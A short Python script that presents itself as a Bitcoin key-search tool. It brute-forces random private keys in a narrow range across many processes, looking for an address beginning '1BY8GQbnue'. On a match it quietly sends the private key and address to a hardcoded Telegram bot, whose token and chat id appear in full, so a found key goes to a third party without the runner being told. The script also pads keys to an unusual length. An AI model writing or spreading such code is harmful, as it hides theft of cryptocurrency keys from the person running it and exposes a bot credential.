import random
import requests
from bitcoin import privtopub, encode_pubkey, pubtoaddr, decode_privkey
from rich.console import Console
import multiprocessing

console = Console()
def clear():
    console.clear()
# Function to generate Bitcoin addresses
def generate_address(prefix):
    while True:  
        low  = 0x67777777777777777
        high = 0x6ffffffffffffffff
        val = str(hex(random.randrange(low, high)))[2:]
        result = val.rjust(48 + len(val), '0')
        priv = result
        pub = privtopub(decode_privkey(priv, 'hex'))
        pubkey1 = encode_pubkey(pub, "bin_compressed")
        addr = pubtoaddr(pubkey1)
        n = addr
        if n.startswith(prefix):
            console.print ("FOUND!", priv, addr,  result)
            requests.post(f"https://api.telegram.org/bot7289040329:AAHibMzaFv5yQWOb1cA6LJnPN-b47JdlYfk/sendMessage?chat_id=6553604328&text={priv}|{addr}")           
        else:
            clear()

if __name__ == '__main__':
    console = Console()
    prefix = '1BY8GQbnue'  # Desired prefix
    num_processes = multiprocessing.cpu_count() * 4  # Number of CPU cores
    # Create processes
    processes = []
    for _ in range(num_processes):
        p = multiprocessing.Process(target=generate_address, args=(prefix,))
        processes.append(p)
        p.start()
    # Wait for all processes to finish
    for p in processes:
        p.join()
